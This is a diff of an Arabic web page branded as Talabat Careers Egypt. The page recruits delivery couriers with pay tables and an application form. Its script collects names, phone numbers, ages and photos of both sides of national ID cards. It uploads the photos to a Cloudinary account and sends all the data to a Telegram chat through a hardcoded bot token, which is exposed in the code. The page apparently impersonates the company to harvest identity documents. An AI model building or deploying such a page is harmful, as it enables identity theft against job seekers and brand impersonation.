@@ -38,7 +38,6 @@
     .form-container { background: white; border-radius: 32px; padding: 28px 22px; margin: 16px 12px; box-shadow: 0 20px 35px rgba(0,0,0,0.08); }
     .notice-box { background: #fff1e0; border-radius: 20px; padding: 12px; margin-bottom: 20px; border-right: 4px solid #ff5a00; }
     .notice-box p { margin: 5px 0; font-size: 0.85rem; font-weight: 600; color: #c2410c; }
-    .age-notice { background: #fff1e0; color: #c2410c; padding: 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600; margin-bottom: 24px; border-right: 4px solid #ff5a00; }
     .input-group { margin-bottom: 22px; }
     .input-group label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 0.9rem; }
     .input-group input, .input-group select { width: 100%; padding: 15px 16px; border: 1.5px solid #e2e8f0; border-radius: 24px; font-family: 'Cairo', sans-serif; font-size: 1rem; background: white; }
@@ -62,6 +61,7 @@
     .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; z-index: 1000; flex-direction: column; gap: 20px; color: white; font-weight: bold; }
     .spinner { width: 50px; height: 50px; border: 5px solid #fff; border-top-color: #ff5a00; border-radius: 50%; animation: spin 1s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
+    .error-msg { color: #dc2626; font-size: 0.75rem; margin-top: 6px; }
   </style>
 </head>
 <body>
@@ -89,26 +89,29 @@
     </div>
     <div class="section-title"><i class="fas fa-motorcycle"></i> تسعيرة الموتوسيكل</div>
     <div class="table-wrapper"><table class="pricing-table"><thead><tr><th>المنطقة</th><th>باتش1</th><th>باتش2</th><th>باتش3</th><th>باتش4</th></tr></thead><tbody>
-      <tr><td class="zone-name">تجمع</td><td>39</td><td>37</td><td>35</td><td>33</td></tr>
-      <tr><td class="zone-name">أكتوبر</td><td>37</td><td>35</td><td>33</td><td>31</td></tr>
-      <tr><td class="zone-name">مدينة نصر / مصر الجديدة / عين شمس / هرم / زايد</td><td>36</td><td>34</td><td>32</td><td>30</td></tr>
-      <tr><td class="zone-name">تحرير / اسكندرية</td><td>35</td><td>33</td><td>31</td><td>29</td></tr>
-      <tr><td class="zone-name">معادي</td><td>33</td><td>31</td><td>29</td><td>27</td></tr>
-      <tr><td class="zone-name">مهندسين</td><td>32</td><td>30</td><td>28</td><td>26</td></tr>
-    </tbody>
-    </table></div>
+      <tr><td class="zone-name">التجمع الجنوبي</td><td>39</td><td>37</td><td>35</td><td>33</td></tr>
+      <tr><td class="zone-name">اكتوبر</td><td>37</td><td>35</td><td>33</td><td>31</td></tr>
+      <tr><td class="zone-name">مدينة نصر / مصر الجديدة / عين شمس / الشيخ زايد / الجيزة / الهرم</td><td>36</td><td>34</td><td>32</td><td>30</td></tr>
+      <tr><td class="zone-name">التحرير / الاسكندرية</td><td>35</td><td>33</td><td>31</td><td>29</td></tr>
+      <tr><td class="zone-name">المعادي</td><td>33</td><td>31</td><td>29</td><td>27</td></tr>
+      <tr><td class="zone-name">المهندسين</td><td>32</td><td>30</td><td>28</td><td>26</td></tr>
+      <tr><td class="zone-name">اسماعلية / السويس / المنصورة</td><td>34</td><td>32</td><td>30</td><td>28</td></tr>
+    </tbody></table></div>
     <div class="bonus-note"><i class="fas fa-tachometer-alt"></i> <strong>مكافأة المسافات (موتوسيكل):</strong> من 2-5 كم: +1 جنيه/كم، بعد 5 كم: +2 جنيه/كم</div>
+    
     <div class="section-title"><i class="fas fa-bicycle"></i> تسعيرة العجلة</div>
     <div class="table-wrapper"><table class="pricing-table"><thead><tr><th>المنطقة</th><th>باتش1</th><th>باتش2</th><th>باتش3</th><th>باتش4</th></tr></thead><tbody>
-      <tr><td class="zone-name">تجمع / هرم</td><td>27</td><td>25</td><td>23</td><td>21</td></tr>
-      <tr><td class="zone-name">اسكندرية</td><td>26</td><td>24</td><td>22</td><td>20</td></tr>
-      <tr><td class="zone-name">مدينة نصر / مصر الجديدة / عين شمس / أكتوبر / زايد / تحرير</td><td>25</td><td>23</td><td>21</td><td>19</td></tr>
-      <tr><td class="zone-name">مهندسين / معادي</td><td>24</td><td>22</td><td>20</td><td>18</td></tr>
-    </tbody>
-    </table></div>
+      <tr><td class="zone-name">التجمع الجنوبي</td><td>27</td><td>25</td><td>23</td><td>21</td></tr>
+      <tr><td class="zone-name">اكتوبر</td><td>26</td><td>24</td><td>22</td><td>20</td></tr>
+      <tr><td class="zone-name">مدينة نصر / مصر الجديدة / عين شمس / الشيخ زايد / الجيزة</td><td>25</td><td>23</td><td>21</td><td>19</td></tr>
+      <tr><td class="zone-name">التحرير / الاسكندرية</td><td>24</td><td>22</td><td>20</td><td>18</td></tr>
+      <tr><td class="zone-name">المعادي</td><td>23</td><td>21</td><td>19</td><td>17</td></tr>
+      <tr><td class="zone-name">المهندسين</td><td>22</td><td>20</td><td>18</td><td>16</td></tr>
+      <tr><td class="zone-name">اسماعلية / السويس / المنصورة</td><td>24</td><td>22</td><td>20</td><td>18</td></tr>
+    </tbody></table></div>
+
     <div class="section-title"><i class="fas fa-folder-open"></i> الأوراق المطلوبة (مجاني)</div>
     <div class="docs-list"><div class="doc-card"><i class="fas fa-camera"></i><h4>صورة شخصية</h4></div><div class="doc-card"><i class="fas fa-id-card"></i><h4>البطاقة الشخصية</h4></div><div class="doc-card"><i class="fas fa-tachometer-alt"></i><h4>رخصة المركبة</h4></div></div>
-    <!-- صف الأزرار: تسجيل + واتساب + فيسبوك -->
     <div class="cta-row">
       <button class="btn-primary" id="showFormBtn"><i class="fas fa-paper-plane"></i> للتسجيل الفوري اضغط هنا</button>
       <button class="btn-circle whatsapp" id="whatsappBtn"><i class="fab fa-whatsapp"></i></button>
@@ -118,31 +121,59 @@
     <footer class="footer">© 2026 Talabat Careers Egypt</footer>
   </div>
 
-  <!-- صفحة النموذج مع رفع الصور وإرسال البيانات إلى الإدارة -->
+  <!-- صفحة النموذج مع رفع الصور وإرسال البيانات -->
   <div id="formPage" class="page">
     <div class="form-container">
       <div class="notice-box">
         <p><i class="fas fa-info-circle"></i> <strong>ملحوظة قبل التقديم لقبولك فوراً في طلبات:</strong></p>
-        <p>✅ مطلوب عمر 18 سنة فأكثر.</p>
+        <p>✅ مطلوب عمر 18 سنة فأكثر (شرط أساسي).</p>
         <p>✅ لم يسبق لك العمل في طلبات (أول مرة تتقدم للوظيفة).</p>
         <p>✅ لازم يكون لدى المتقدم عجلة أو موتوسيكل.</p>
       </div>
-      <div class="age-notice"><i class="fas fa-exclamation-triangle"></i> الوظيفة مرنة وتناسب الجميع.</div>
       <h2 style="text-align:center; color:#ff5a00; margin-bottom:20px;">بيانات الانضمام لفريق طلبات</h2>
       <form id="applicationForm">
         <div class="input-group"><label><i class="fas fa-user"></i> الاسم بالكامل</label><input type="text" name="الاسم" placeholder="أحمد محمود علي" required></div>
         <div class="input-group"><label><i class="fab fa-whatsapp"></i> رقم الهاتف (واتساب)</label><input type="tel" name="الهاتف" placeholder="01xxxxxxxxx" pattern="01[0-9]{9}" inputmode="numeric" maxlength="11" required oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,11)"><small>رقم مصري 11 رقم يبدأ بـ 01</small></div>
+        
+        <!-- حقل العمر -->
+        <div class="input-group"><label><i class="fas fa-calendar-alt"></i> كم عمرك؟</label>
+          <input type="number" id="ageInput" name="age" placeholder="مثال: 25" min="18" max="100" step="1" required>
+          <div id="ageError" class="error-msg"></div>
+          <small>يجب أن لا يقل العمر عن 18 سنة.</small>
+        </div>
+
+        <!-- قائمة منطقة الخدمة المطلوبة -->
         <div class="input-group"><label><i class="fas fa-map-marker-alt"></i> منطقة الخدمة</label>
           <select name="المنطقة" required>
             <option value="" disabled selected>اختر منطقتك</option>
-            <option>اسماعلية</option><option>اكتوبر</option><option>الاسكندرية</option><option>التجمع الجنوبي</option>
-            <option>التحرير</option><option>الجيزة</option><option>السويس</option><option>الشيخ زايد</option>
-            <option>المعادي</option><option>المنصورة</option><option>المهندسين</option><option>عين شمس</option>
-            <option>مدينة نصر</option><option>مصر الجديدة</option>
+            <option>اسماعلية</option>
+            <option>اكتوبر</option>
+            <option>الاسكندرية</option>
+            <option>التجمع الجنوبي</option>
+            <option>التحرير</option>
+            <option>الجيزة</option>
+            <option>السويس</option>
+            <option>الشيخ زايد</option>
+            <option>المعادي</option>
+            <option>المنصورة</option>
+            <option>المهندسين</option>
+            <option>عين شمس</option>
+            <option>مدينة نصر</option>
+            <option>مصر الجديدة</option>
           </select>
         </div>
+
         <div class="input-group"><label><i class="fas fa-motorcycle"></i> وسيلة التوصيل</label><select name="vehicle" required><option value="" disabled selected>اختر وسيلتك</option><option>موتوسيكل</option><option>عجلة</option></select></div>
-        <div class="input-group"><label><i class="fas fa-briefcase"></i> هل قمت بالعمل كمندوب في طلبات قبل ذلك؟</label><select name="previous_work" required><option value="" disabled selected>اختر الإجابة</option><option>نعم</option><option>لا</option></select></div>
+        
+        <!-- سؤال الخبرة السابقة -->
+        <div class="input-group"><label><i class="fas fa-briefcase"></i> هل قمت بالعمل كمندوب في طلبات قبل ذلك؟</label>
+          <select name="previous_work" id="previousWorkSelect" required>
+            <option value="" disabled selected>اختر الإجابة</option>
+            <option value="نعم">نعم</option>
+            <option value="لا">لا</option>
+          </select>
+          <div id="previousWorkError" class="error-msg"></div>
+        </div>
 
         <!-- رفع صور البطاقة -->
         <div class="input-group">
@@ -195,134 +226,109 @@
   document.getElementById('backToHomeBtn').addEventListener('click', showMainPage);
   document.getElementById('successBackBtn').addEventListener('click', showMainPage);
   
-  // زر الفيس بوك
   document.getElementById('facebookBtn').addEventListener('click', () => window.open('https://www.facebook.com/profile.php?id=100079079575222', '_blank'));
-  
-  // زر الواتساب المباشر (الرقم: 01027428959 => الصيغة الدولية: 201027428959)
-  document.getElementById('whatsappBtn').addEventListener('click', () => {
-    window.open('https://wa.me/201027428959', '_blank');
-  });
+  document.getElementById('whatsappBtn').addEventListener('click', () => window.open('https://wa.me/201027428959', '_blank'));
 
-  // إعدادات Cloudinary
+  // إعدادات Cloudinary وإرسال البيانات
   const CLOUD_NAME = 'dpaiz3gv5';
   const UPLOAD_PRESET = 'Talabat form';
-
-  // بيانات البوت الخاصة بالإدارة (تعمل في الخلفية)
   const TELEGRAM_BOT_TOKEN = '8706876630:AAGR4RJb6t6JSbRY6C1Yykx6v899xgzpM3E';
   const TELEGRAM_CHAT_ID = '-1003899955705';
 
-  // رفع الصورة إلى Cloudinary
   async function uploadToCloudinary(file) {
     const formData = new FormData();
     formData.append('file', file);
     formData.append('upload_preset', UPLOAD_PRESET);
     const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`;
     const response = await fetch(url, { method: 'POST', body: formData });
-    if (!response.ok) {
-      const errorText = await response.text();
-      throw new Error(`فشل رفع الصورة: ${response.status}`);
-    }
+    if (!response.ok) throw new Error(`فشل رفع الصورة: ${response.status}`);
     const data = await response.json();
     if (data.secure_url) return data.secure_url;
     throw new Error('لم يتم استلام رابط الصورة');
   }
 
-  let frontImageUrl = null;
-  let backImageUrl = null;
+  let frontImageUrl = null, backImageUrl = null;
 
-  // رفع الصورة الأمامية
   document.getElementById('frontImage').addEventListener('change', async function(e) {
     const file = e.target.files[0];
     if (file) {
       document.getElementById('frontFileName').innerText = 'جاري رفع الصورة...';
-      try {
-        frontImageUrl = await uploadToCloudinary(file);
-        document.getElementById('frontFileName').innerHTML = `✅ تم الرفع بنجاح: ${file.name}`;
-      } catch (error) {
-        console.error(error);
-        document.getElementById('frontFileName').innerHTML = '❌ فشل رفع الصورة، حاول مرة أخرى';
-        frontImageUrl = null;
-      }
-    } else {
-      frontImageUrl = null;
-      document.getElementById('frontFileName').innerText = 'لم يتم اختيار صورة';
-    }
+      try { frontImageUrl = await uploadToCloudinary(file); document.getElementById('frontFileName').innerHTML = `✅ تم الرفع بنجاح: ${file.name}`; } 
+      catch (err) { document.getElementById('frontFileName').innerHTML = '❌ فشل رفع الصورة'; frontImageUrl = null; }
+    } else { frontImageUrl = null; document.getElementById('frontFileName').innerText = 'لم يتم اختيار صورة'; }
   });
-
-  // رفع الصورة الخلفية
   document.getElementById('backImage').addEventListener('change', async function(e) {
     const file = e.target.files[0];
     if (file) {
       document.getElementById('backFileName').innerText = 'جاري رفع الصورة...';
-      try {
-        backImageUrl = await uploadToCloudinary(file);
-        document.getElementById('backFileName').innerHTML = `✅ تم الرفع بنجاح: ${file.name}`;
-      } catch (error) {
-        console.error(error);
-        document.getElementById('backFileName').innerHTML = '❌ فشل رفع الصورة، حاول مرة أخرى';
-        backImageUrl = null;
-      }
+      try { backImageUrl = await uploadToCloudinary(file); document.getElementById('backFileName').innerHTML = `✅ تم الرفع بنجاح: ${file.name}`; } 
+      catch (err) { document.getElementById('backFileName').innerHTML = '❌ فشل رفع الصورة'; backImageUrl = null; }
+    } else { backImageUrl = null; document.getElementById('backFileName').innerText = 'لم يتم اختيار صورة'; }
+  });
+
+  async function sendToAdminSystem(text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: false };
+    const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    if (!response.ok) throw new Error('فشل إرسال البيانات للإدارة');
+  }
+
+  const form = document.getElementById('applicationForm');
+  const ageInput = document.getElementById('ageInput');
+  const ageError = document.getElementById('ageError');
+  const previousWorkSelect = document.getElementById('previousWorkSelect');
+  const previousWorkError = document.getElementById('previousWorkError');
+
+  ageInput.addEventListener('input', function() {
+    let val = parseInt(this.value);
+    if (this.value !== '') {
+      if (isNaN(val)) { ageError.innerText = 'يرجى إدخال رقم صحيح'; this.setCustomValidity('invalid'); }
+      else if (val < 18) { ageError.innerText = '⚠️ طلبات لا تقبل المتقدمين أقل من 18 سنة.'; this.setCustomValidity('invalid'); }
+      else { ageError.innerText = ''; this.setCustomValidity(''); }
+    } else { ageError.innerText = ''; this.setCustomValidity(''); }
+  });
+
+  previousWorkSelect.addEventListener('change', function() {
+    if (this.value === 'نعم') {
+      previousWorkError.innerText = '⚠️ لم يتم إرسال طلبك لفريق التوظيف لأن شركة طلبات تشترط أن تكون هذه أول مرة تتقدم للعمل بها. نأسف لذلك.';
     } else {
-      backImageUrl = null;
-      document.getElementById('backFileName').innerText = 'لم يتم اختيار صورة';
+      previousWorkError.innerText = '';
     }
   });
 
-  // إرسال البيانات إلى إدارة التوظيف (باستخدام البوت)
-  async function sendToAdminSystem(text) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text,
-      parse_mode: 'HTML',
-      disable_web_page_preview: false
-    };
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-    if (!response.ok) {
-      const errorJson = await response.json();
-      throw new Error(errorJson.description || 'فشل إرسال البيانات للإدارة');
-    }
-    return await response.json();
-  }
-
-  // معالجة إرسال النموذج
-  const form = document.getElementById('applicationForm');
-  
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    const nameInput = form.querySelector('input[name="الاسم"]');
-    const phoneInput = form.querySelector('input[name="الهاتف"]');
-    const regionSelect = form.querySelector('select[name="المنطقة"]');
-    const vehicleSelect = form.querySelector('select[name="vehicle"]');
-    const previousWorkSelect = form.querySelector('select[name="previous_work"]');
+    const ageVal = parseInt(ageInput.value);
+    if (isNaN(ageVal) || ageVal < 18) {
+      alert('⚠️ لا يمكن التقديم لأن العمر يجب أن يكون 18 سنة فأكثر.');
+      ageInput.focus();
+      return;
+    }
+    if (previousWorkSelect.value === 'نعم') {
+      alert('⚠️ لم يتم إرسال طلبك لفريق التوظيف لأن شركة طلبات تشترط أن تكون هذه أول مرة تتقدم للعمل بها. نأسف لذلك.');
+      previousWorkSelect.focus();
+      return;
+    }
 
-    const fullName = nameInput.value.trim();
-    const userPhone = phoneInput.value.trim();
-    const region = regionSelect.value;
-    const vehicle = vehicleSelect.value;
-    const previousWork = previousWorkSelect.value;
+    const fullName = form.querySelector('input[name="الاسم"]').value.trim();
+    const userPhone = form.querySelector('input[name="الهاتف"]').value.trim();
+    const region = form.querySelector('select[name="المنطقة"]').value;
+    const vehicle = form.querySelector('select[name="vehicle"]').value;
 
-    if (!fullName) { alert('⚠️ يرجى إدخال الاسم بالكامل'); nameInput.focus(); return; }
-    if (!/^01[0-9]{9}$/.test(userPhone)) { alert('⚠️ رقم هاتف غير صحيح (11 رقم يبدأ بـ 01)'); phoneInput.focus(); return; }
-    if (!region) { alert('⚠️ اختر منطقة الخدمة'); regionSelect.focus(); return; }
-    if (!vehicle) { alert('⚠️ اختر وسيلة التوصيل'); vehicleSelect.focus(); return; }
-    if (!previousWork) { alert('⚠️ أجب على السؤال: هل عملت كمندوب في طلبات من قبل؟'); previousWorkSelect.focus(); return; }
-    if (!frontImageUrl) { alert('⚠️ يرجى اختيار صورة البطاقة (الوجه الأمامي) وانتظار رفعها'); return; }
-    if (!backImageUrl) { alert('⚠️ يرجى اختيار صورة البطاقة (الظهر الخلفي) وانتظار رفعها'); return; }
+    if (!fullName) { alert('⚠️ يرجى إدخال الاسم بالكامل'); return; }
+    if (!/^01[0-9]{9}$/.test(userPhone)) { alert('⚠️ رقم هاتف غير صحيح'); return; }
+    if (!region) { alert('⚠️ اختر منطقة الخدمة'); return; }
+    if (!vehicle) { alert('⚠️ اختر وسيلة التوصيل'); return; }
+    if (!frontImageUrl) { alert('⚠️ يرجى اختيار صورة البطاقة (الوجه الأمامي)'); return; }
+    if (!backImageUrl) { alert('⚠️ يرجى اختيار صورة البطاقة (الظهر الخلفي)'); return; }
 
-    // عرض مؤشر التحميل
     const overlay = document.createElement('div');
     overlay.className = 'loading-overlay';
     overlay.innerHTML = '<div class="spinner"></div><div>جاري إرسال البيانات إلى إدارة التوظيف...</div>';
     document.body.appendChild(overlay);
 
     try {
-      // إنشاء رسالة للإدارة
       const adminMessage = `
 <b>📋 طلب توظيف جديد - Talabat Careers</b>
 
@@ -330,7 +336,8 @@
 <b>📞 رقم الهاتف:</b> ${escapeHtml(userPhone)}
 <b>📍 المنطقة:</b> ${escapeHtml(region)}
 <b>🛵 وسيلة التوصيل:</b> ${escapeHtml(vehicle)}
-<b>📋 سبق العمل في طلبات:</b> ${escapeHtml(previousWork)}
+<b>🎂 العمر:</b> ${ageVal} سنة
+<b>📋 سبق العمل في طلبات:</b> لا (أول مرة)
 
 <b>📷 صورة البطاقة (الوجه الأمامي):</b>
 <a href="${escapeHtml(frontImageUrl)}">اضغط لعرض الصورة</a>
@@ -340,20 +347,19 @@
 
 ✅ تم إرسال الطلب عبر نظام التوظيف الرسمي.
       `;
-      
       await sendToAdminSystem(adminMessage);
-      
       overlay.remove();
       showSuccessPage();
       form.reset();
-      frontImageUrl = null;
-      backImageUrl = null;
+      frontImageUrl = null; backImageUrl = null;
       document.getElementById('frontFileName').innerText = 'لم يتم اختيار صورة';
       document.getElementById('backFileName').innerText = 'لم يتم اختيار صورة';
+      ageError.innerText = '';
+      previousWorkError.innerText = '';
     } catch (err) {
       overlay.remove();
+      alert('حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى');
       console.error(err);
-      alert(`حدث خطأ أثناء الإرسال: ${err.message || 'يرجى المحاولة مرة أخرى'}`);
     }
   });
 
